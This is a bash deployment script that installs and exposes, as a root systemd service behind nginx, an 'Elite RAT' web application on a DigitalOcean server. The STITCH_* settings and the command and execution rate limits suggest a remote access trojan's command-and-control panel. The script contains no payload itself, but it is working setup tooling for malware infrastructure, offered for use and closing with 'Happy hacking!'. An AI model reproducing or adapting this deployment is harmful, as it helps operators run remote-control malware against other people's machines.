#!/bin/bash
###############################################################################
# AUTOMATED DIGITALOCEAN DEPLOYMENT SCRIPT
# One-command deployment for Elite RAT Web Application
# 
# Usage: sudo bash auto_deploy_digitalocean.sh
###############################################################################

set -e  # Exit on any error

# Colors for pretty output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
APP_NAME="elite-rat"
INSTALL_DIR="/opt/elite-rat"
VENV_DIR="$INSTALL_DIR/venv"
SERVICE_NAME="elite-rat"
WEB_PORT=5000
LOG_FILE="/var/log/elite-rat-deploy.log"

# Print functions
print_header() {
    echo -e "\n${BLUE}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}\n"
}

print_success() {
    echo -e "${GREEN}✓${NC} $1"
}

print_error() {
    echo -e "${RED}✗${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}⚠${NC} $1"
}

print_info() {
    echo -e "${BLUE}ℹ${NC} $1"
}

# Logging function
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "This script must be run as root"
        echo "Please run: sudo bash $0"
        exit 1
    fi
    print_success "Running as root"
}

# Detect OS
detect_os() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$NAME
        VER=$VERSION_ID
        print_success "Detected OS: $OS $VER"
    else
        print_error "Cannot detect OS"
        exit 1
    fi
}

# Update system
update_system() {
    print_info "Updating system packages..."
    apt-get update -qq > /dev/null 2>&1
    print_success "System updated"
}

# Install dependencies
install_dependencies() {
    print_info "Installing required packages..."
    
    PACKAGES=(
        python3
        python3-pip
        python3-venv
        python3-dev
        git
        nginx
        ufw
        build-essential
        libssl-dev
        libffi-dev
        curl
        wget
        net-tools
    )
    
    for package in "${PACKAGES[@]}"; do
        if dpkg -l | grep -q "^ii  $package "; then
            print_success "$package already installed"
        else
            apt-get install -y -qq "$package" >> "$LOG_FILE" 2>&1
            print_success "Installed $package"
        fi
    done
}

# Setup application directory
setup_app_directory() {
    print_info "Setting up application directory..."
    
    if [ -d "$INSTALL_DIR" ]; then
        print_warning "Directory $INSTALL_DIR already exists"
        read -p "Do you want to backup and reinstall? (y/n) " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            BACKUP_DIR="${INSTALL_DIR}_backup_$(date +%Y%m%d_%H%M%S)"
            mv "$INSTALL_DIR" "$BACKUP_DIR"
            print_success "Backed up to $BACKUP_DIR"
        else
            print_info "Using existing directory"
            return
        fi
    fi
    
    # Check if we're already in the code directory
    if [ -f "./web_app_real.py" ]; then
        print_info "Found code in current directory, copying to $INSTALL_DIR..."
        mkdir -p "$INSTALL_DIR"
        cp -r ./* "$INSTALL_DIR/"
        print_success "Code copied to $INSTALL_DIR"
    else
        print_error "Cannot find web_app_real.py in current directory"
        print_info "Please run this script from the elite-rat code directory"
        exit 1
    fi
}

# Create Python virtual environment
setup_python_env() {
    print_info "Setting up Python virtual environment..."
    
    cd "$INSTALL_DIR"
    
    if [ ! -d "$VENV_DIR" ]; then
        python3 -m venv "$VENV_DIR"
        print_success "Virtual environment created"
    else
        print_success "Virtual environment already exists"
    fi
    
    # Activate and install requirements
    source "$VENV_DIR/bin/activate"
    
    print_info "Upgrading pip..."
    pip install --upgrade pip -q >> "$LOG_FILE" 2>&1
    
    print_info "Installing Python dependencies..."
    if [ -f "requirements.txt" ]; then
        pip install -r requirements.txt -q >> "$LOG_FILE" 2>&1
        print_success "Python dependencies installed"
    else
        print_warning "requirements.txt not found, installing core packages..."
        pip install -q flask flask-socketio flask-cors cryptography pyyaml pyjwt pillow dnspython psutil requests python-engineio python-socketio python-dotenv colorama werkzeug >> "$LOG_FILE" 2>&1
        print_success "Core packages installed"
    fi
}

# Generate secure credentials
generate_credentials() {
    print_info "Generating secure credentials..."
    
    ADMIN_PASSWORD=$(openssl rand -base64 16 | tr -d "=+/" | cut -c1-20)
    SECRET_KEY=$(openssl rand -hex 32)
    
    print_success "Credentials generated"
}

# Create environment file
create_env_file() {
    print_info "Creating environment configuration..."
    
    ENV_FILE="$INSTALL_DIR/.env"
    
    cat > "$ENV_FILE" << EOF
# Elite RAT Production Configuration
# Generated on $(date)

# Admin Credentials
STITCH_ADMIN_USER=admin
STITCH_ADMIN_PASSWORD=$ADMIN_PASSWORD

# Server Settings
STITCH_HOST=0.0.0.0
STITCH_PORT=$WEB_PORT
STITCH_DEBUG=false
STITCH_SECRET_KEY=$SECRET_KEY

# Security
STITCH_ENABLE_HTTPS=false
STITCH_SESSION_TIMEOUT=30
STITCH_MAX_LOGIN_ATTEMPTS=5
STITCH_LOGIN_LOCKOUT_MINUTES=15

# Logging
STITCH_ENABLE_FILE_LOGGING=true
STITCH_LOG_LEVEL=INFO
STITCH_LOG_MAX_BYTES=10485760
STITCH_LOG_BACKUP_COUNT=10

# Rate Limiting
STITCH_COMMANDS_PER_MINUTE=30
STITCH_EXECUTIONS_PER_MINUTE=60
STITCH_API_POLLING_PER_HOUR=1000
EOF
    
    chmod 600 "$ENV_FILE"
    print_success "Environment file created at $ENV_FILE"
}

# Create systemd service
create_systemd_service() {
    print_info "Creating systemd service..."
    
    SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
    
    cat > "$SERVICE_FILE" << EOF
[Unit]
Description=Elite RAT Web Application
After=network.target
Wants=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$INSTALL_DIR
Environment="PATH=$VENV_DIR/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
EnvironmentFile=$INSTALL_DIR/.env
ExecStart=$VENV_DIR/bin/python3 $INSTALL_DIR/web_app_real.py
Restart=always
RestartSec=10
StandardOutput=append:/var/log/elite-rat.log
StandardError=append:/var/log/elite-rat-error.log

# Security settings
NoNewPrivileges=true
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME" >> "$LOG_FILE" 2>&1
    print_success "Systemd service created and enabled"
}

# Configure Nginx
configure_nginx() {
    print_info "Configuring Nginx reverse proxy..."
    
    # Get server IP
    SERVER_IP=$(curl -s ifconfig.me 2>/dev/null || echo "YOUR_SERVER_IP")
    
    NGINX_CONF="/etc/nginx/sites-available/$APP_NAME"
    
    cat > "$NGINX_CONF" << EOF
server {
    listen 80;
    server_name $SERVER_IP _;

    client_max_body_size 100M;

    location / {
        proxy_pass http://127.0.0.1:$WEB_PORT;
        proxy_http_version 1.1;
        
        # WebSocket support
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection 'upgrade';
        
        # Standard proxy headers
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        
        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
        
        proxy_cache_bypass \$http_upgrade;
    }
}
EOF
    
    # Enable site
    ln -sf "$NGINX_CONF" "/etc/nginx/sites-enabled/$APP_NAME"
    
    # Remove default site
    rm -f /etc/nginx/sites-enabled/default
    
    # Test configuration
    if nginx -t >> "$LOG_FILE" 2>&1; then
        systemctl restart nginx
        print_success "Nginx configured and restarted"
    else
        print_error "Nginx configuration test failed"
        print_info "Check $LOG_FILE for details"
    fi
}

# Configure firewall
configure_firewall() {
    print_info "Configuring firewall..."
    
    # Check if UFW is active
    if ufw status | grep -q "Status: active"; then
        print_warning "UFW is already active"
    fi
    
    # Allow SSH (IMPORTANT!)
    ufw allow 22/tcp >> "$LOG_FILE" 2>&1
    print_success "Allowed SSH (port 22)"
    
    # Allow HTTP
    ufw allow 80/tcp >> "$LOG_FILE" 2>&1
    print_success "Allowed HTTP (port 80)"
    
    # Allow HTTPS
    ufw allow 443/tcp >> "$LOG_FILE" 2>&1
    print_success "Allowed HTTPS (port 443)"
    
    # Allow app port (if accessed directly)
    ufw allow $WEB_PORT/tcp >> "$LOG_FILE" 2>&1
    print_success "Allowed app port ($WEB_PORT)"
    
    # Enable firewall
    ufw --force enable >> "$LOG_FILE" 2>&1
    print_success "Firewall enabled"
}

# Start service
start_service() {
    print_info "Starting application service..."
    
    systemctl start "$SERVICE_NAME"
    sleep 3
    
    if systemctl is-active --quiet "$SERVICE_NAME"; then
        print_success "Service started successfully"
    else
        print_error "Service failed to start"
        print_info "Check logs: journalctl -u $SERVICE_NAME -n 50"
        exit 1
    fi
}

# Display access information
show_access_info() {
    SERVER_IP=$(curl -s ifconfig.me 2>/dev/null || echo "YOUR_SERVER_IP")
    
    print_header "🎉 DEPLOYMENT COMPLETE!"
    
    echo -e "${GREEN}Your Elite RAT web application is now live!${NC}\n"
    
    echo -e "${YELLOW}📋 Access Information:${NC}"
    echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo -e "${BLUE}Web Interface:${NC}  http://$SERVER_IP"
    echo -e "${BLUE}Direct Access:${NC}  http://$SERVER_IP:$WEB_PORT"
    echo -e ""
    echo -e "${YELLOW}🔐 Login Credentials:${NC}"
    echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo -e "${BLUE}Username:${NC}       admin"
    echo -e "${BLUE}Password:${NC}       ${GREEN}$ADMIN_PASSWORD${NC}"
    echo -e ""
    echo -e "${RED}⚠️  IMPORTANT: Save these credentials! They are also in:${NC}"
    echo -e "${BLUE}$INSTALL_DIR/.env${NC}"
    echo -e ""
    echo -e "${YELLOW}🛠️  Useful Commands:${NC}"
    echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo -e "${BLUE}Check status:${NC}      systemctl status $SERVICE_NAME"
    echo -e "${BLUE}View logs:${NC}         journalctl -u $SERVICE_NAME -f"
    echo -e "${BLUE}Restart app:${NC}       systemctl restart $SERVICE_NAME"
    echo -e "${BLUE}Stop app:${NC}          systemctl stop $SERVICE_NAME"
    echo -e ""
    echo -e "${YELLOW}📝 Next Steps:${NC}"
    echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo -e "1. Save your login credentials in a safe place"
    echo -e "2. Access your web interface at http://$SERVER_IP"
    echo -e "3. Consider setting up HTTPS with Let's Encrypt"
    echo -e "4. Review firewall rules with: ufw status"
    echo -e "5. Monitor logs regularly: journalctl -u $SERVICE_NAME -f"
    echo -e ""
    echo -e "${GREEN}Happy hacking! 🚀${NC}\n"
}

# Main deployment function
main() {
    print_header "Elite RAT - Automated DigitalOcean Deployment"
    
    print_info "Starting deployment..."
    log "Deployment started"
    
    check_root
    detect_os
    update_system
    install_dependencies
    setup_app_directory
    setup_python_env
    generate_credentials
    create_env_file
    create_systemd_service
    configure_nginx
    configure_firewall
    start_service
    show_access_info
    
    log "Deployment completed successfully"
}

# Handle errors
trap 'print_error "An error occurred. Check $LOG_FILE for details"; exit 1' ERR

# Run main function
main
